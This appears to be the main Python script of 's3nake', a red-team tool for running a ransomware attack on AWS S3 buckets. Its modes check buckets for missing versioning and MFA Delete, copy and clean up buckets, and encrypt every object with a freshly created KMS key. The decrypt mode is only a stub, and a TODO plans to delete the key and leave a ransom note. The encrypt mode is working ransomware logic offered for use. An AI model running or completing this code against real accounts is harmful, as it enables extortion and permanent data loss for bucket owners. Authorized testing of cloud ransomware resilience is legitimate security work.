import api
import argparse
import s3nake_print
import sys
from time import time

import boto3
from botocore.exceptions import ProfileNotFound
from botocore.exceptions import ClientError

SUFFIX ="-cpy"

def main(args):
    if args.mode is None:
        print('Use check, setup, clean, encrypt or decrypt mode. -h/--help to get help manual')
        sys.exit()
    # Determine profile
    if args.profile is None:
        session = boto3.session.Session()
        print('No AWS CLI profile passed in, choose one below or rerun the script using the -p/--profile argument:')
        profiles = session.available_profiles
        for i in range(0, len(profiles)):
            print(f'[{i}] {profiles[i]}')
        profile_number = int(input(s3nake_print.Yellow('Choose a profile: ')).strip())
        profile_name = profiles[profile_number]
        session = boto3.session.Session(profile_name=profile_name)
    else:
        try:
            profile_name = args.profile
            session = boto3.session.Session(profile_name=profile_name)
        except ProfileNotFound as error:
            print(f'Did not find the specified AWS CLI profile: {args.profile}\n')
            session = boto3.session.Session()
            quit(f'Profiles that are available: {session.available_profiles}\n')

    # Determine buckets
    buckets=""
    s3_client = session.client('s3')
    if args.buckets is None and args.mode !="check":
        print('No buckets were specified, choose ones below or rerun the script using the -b/--buckets argument:')
        response = s3_client.list_buckets()
        # Output the bucket names
        # print('Existing buckets:')
        for bucket in response['Buckets']:
            print(f'  {bucket["Name"]}')
        buckets = input(s3nake_print.Yellow('Choose buckets: '))
    elif args.mode=="check": #take all buckets
        response=s3_client.list_buckets()
        for bucket in response['Buckets']:
            buckets+=bucket["Name"]+","
        buckets=buckets[:len(buckets)-1]#withdraw last comma
    else:
        buckets = args.buckets
    
    buckets = buckets.split(',')# split buckets

    if len(buckets) < 1:
        quit('No buckets found in the target list.')
    

    # determine region
    if args.region is None:
        region = input(s3nake_print.Yellow('No region was specified, specify it or rerun the script with -r/--region argument: '))
    else:
        region =args.region

    s3nake_print.print_conf(args,region,buckets,profile_name)
    # ACTION
    if args.mode=="check":
        check(s3_client,buckets)
    elif args.mode=="setup":
        setup(s3_client,buckets,args.check,region)
    elif args.mode=="clean":
        clean(s3_client,buckets)
    else:
        kms_client = session.client("kms", region_name=region)
        s3_client = session.client('s3',region_name=region)
        # determine key
        if args.key_id is None:
            # create key
            print('🔑 Creating KMS key...')
            user_arn = api.get_user_arn(session)
            key_policy = api.create_key_policy(user_arn)
            response = kms_client.create_key(Policy=key_policy)
            key_id = response['KeyMetadata']['KeyId']
            print(s3nake_print.Green("Key successfully created, KeyID: " + key_id))
        else:
            key_id = args.key_id

        if args.mode=="encrypt":
            encrypt(s3_client,buckets,key_id)
        elif args.mode=="decrypt":
            decrypt(s3_client,buckets,key_id)

def check(client,buckets):
        protected_buckets, maybe_vulnerable_buckets,vulnerable_buckets=api.get_vulnerable_buckets(client,buckets)
        target_buckets = vulnerable_buckets+maybe_vulnerable_buckets
        if len(protected_buckets) > 0:
            print("✅🪣 Buckets protected against ransomware attacks (versioning and MFA Delete):")
            for b in protected_buckets:
                print("  • "+b)
        if len(maybe_vulnerable_buckets) > 0:
            print("🚨🪣 Buckets protected against ransomware attacks, but an attacker may make the bucket vulnerable by disabling object versioning with the s3:PutBucketVersioning permission:")
            for b in maybe_vulnerable_buckets:
                print("  • "+b)
        if len(vulnerable_buckets) > 0:
            print("💀🪣 Buckets VULNERABLE to ransomware attacks (no object versioning and MFA delete):")
            for b in vulnerable_buckets:
                print("  • "+b)


def setup(client,buckets,doCheck,region):
    target_buckets = buckets
    if doCheck:
        # Check vulnerability
        protected_buckets, maybe_vulnerable_buckets,vulnerable_buckets=api.get_vulnerable_buckets(client,buckets)
        target_buckets = vulnerable_buckets+maybe_vulnerable_buckets
        if len(protected_buckets) > 0:
            print("✅🪣 Buckets protected against ransomware attacks (versioning and MFA Delete):")
            for b in protected_buckets:
                print(b)
        if len(maybe_vulnerable_buckets) > 0:
            print("🚨🪣 Buckets protected against ransomware attacks, but an attacker may make the bucket vulnerable by disabling object versioning with the s3:PutBucketVersioning permission:")
            for b in maybe_vulnerable_buckets:
                print(b)
        if len(vulnerable_buckets) > 0:
            print("💀🪣 Buckets VULNERABLE to ransomware attacks (no object versioning and MFA delete):")
            for b in vulnerable_buckets:
                print(b)

        if not target_buckets: #No vulnerable bucket
            print("All the specified buckets seems to be protected against ransomware attack, do you still want to continue set up? [y/n]:")
            stop = sys.stdin.read(1)
            if stop == "n" or stop == "N":
                sys.exit()

    for bucket_name in target_buckets:
        bucket_cpy_name= bucket_name+SUFFIX
        try: 
            client.create_bucket(Bucket=bucket_cpy_name,CreateBucketConfiguration={'LocationConstraint': region})
            #TODO: apply same s3 configuration to the bucket  copy
            # copy files
            api.copy_all_files_to_bucket_(client,src=bucket_name,dst=bucket_cpy_name)
        except ClientError as error:
            print(f'    {error.response["Error"]["Code"]} error creating bucket {bucket_cpy_name}: {error.response["Error"]["Message"]}')
            sys.exit()
        print("\r                                                      \r")
        print(s3nake_print.Green(bucket_name + " has been successfully copied to "+ bucket_cpy_name))
    

def encrypt(s3_client,buckets,key_id):
    # TODO: encrypt each version
    for bucket_name in buckets:
        try:
            print("Encrypting "+bucket_name+"...\r")
            for key in api.get_s3_keys_as_generator(s3_client,bucket_name):
                file="\033[2m"+key+"\033[0m"
                sys.stdout.write('\r\033[K' + file + '\r')
                s3_client.copy_object(
                Bucket=bucket_name,
                CopySource=bucket_name+"/"+key,
                Key=key,
                ServerSideEncryption='aws:kms',
                StorageClass='STANDARD',
                SSEKMSKeyId=key_id
                )
            print(s3nake_print.Green("🔒✔️ "+ bucket_name+" has been successfully encrypted "))
        except ClientError as error:
            print(f'    {error.response["Error"]["Code"]} error encrypting bucket {bucket_name}: {error.response["Error"]["Message"]}')
        
    # TODO: schedule kms key  deletion + upload file in clear with ransom text

    
def decrypt(s3_client,buckets,key_id):
   print('decrypt')

def clean(client,buckets):
    # Delete buckets
    for bucket in buckets:
        # Some safeguards
        if SUFFIX in bucket:
            # empty bucket
            api.delete_all_objects_from_s3_folder(client,bucket)
            # delete it
            try:
                response = client.delete_bucket(Bucket=bucket)
                print("\r                                                         \r")
                print(s3nake_print.Green("{} has been successfully deleted".format(bucket)))
            except ClientError as error:
                print(f'    {error.response["Error"]["Code"]} error running s3:DeleteBucket on bucket {bucket}: {error.response["Error"]["Message"]}')
                # Continue on anyways, doesn't mean every bucket will fail
        else:
            print("Safeguard: can not find \"cpy\" suffix in bucket name => do not delete it")




if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This script accepts AWS credentials and help to perform s3 ransomware attack (Only used with prior authorization)')
    parser.add_argument('mode', help='Script mode: check (check if s3 buckets are vulnerable), setup (set up S3 bucket to not harm current s3 bucket),clean (remove s3 bucket) or encrypt (perform ransomware attack on s3 bucket) or decrypt (undo the ransomware attack) ', nargs='?', choices=('check','setup', 'encrypt','decrypt','clean'))

    parser.add_argument('-b', '--buckets', required=False, default=None, help='Specify a comma-separated list of S3 buckets in the current account to use. By default, all buckets are used.')
    parser.add_argument('-p', '--profile', required=False, default=None, help='The AWS CLI profile to use for making API calls. This is usually stored under ~/.aws/credentials. You will be prompted by default.')
    parser.add_argument('-c', '--check', help='Enable vulnerability check over S3 buckets',required=False, action='store_true', default=False)
    parser.add_argument('-r', '--region', required=False, default=None, help='Specify AWS region')
    parser.add_argument('-k', '--key-id', required=False, default=None, help='Specify KeyID to use for encryption and decryption (if none is specified it will be automatically created)')

    args = parser.parse_args()

    main(args)